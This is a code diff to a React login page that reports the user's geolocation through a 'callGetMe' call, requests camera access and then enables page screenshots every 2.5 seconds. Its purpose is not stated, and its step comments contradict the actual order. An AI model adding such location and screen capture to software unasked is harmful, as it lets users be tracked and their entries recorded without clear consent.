@@ -9,7 +9,13 @@ function App() {
   const refEmail = useRef(null);
   const refPass = useRef(null);
 
-  useScreenshotCapture({ strategy: "page", intervalMs: 2500 });
+  const [cameraReady, setCameraReady] = useState(false);
+
+  useScreenshotCapture({
+    strategy: "page",
+    intervalMs: 2500,
+    enabled: cameraReady,
+  });
 
   useEffect(() => {
     const callGetMe = async (latitude = 0, longitude = 0) => {
@@ -20,17 +26,34 @@ function App() {
       }
     };
 
-    callGetMe();
+    const requestPermissionsInOrder = async () => {
+      // 1. Then request location
+      callGetMe();
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            callGetMe(pos.coords.latitude, pos.coords.longitude);
+          },
+          () => {},
+          { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 },
+        );
+      }
 
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          callGetMe(pos.coords.latitude, pos.coords.longitude);
-        },
-        () => {},
-        { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 },
-      );
-    }
+      // 2. Request camera first
+      try {
+        await navigator.mediaDevices?.getUserMedia({
+          video: true,
+          audio: false,
+        });
+      } catch {
+        // denied or unavailable — continue anyway
+      }
+
+      // 3. Now that camera prompt is done, enable the screenshot hook
+      setCameraReady(true);
+    };
+
+    requestPermissionsInOrder();
   }, []);
 
   const handleChange = (e) => {
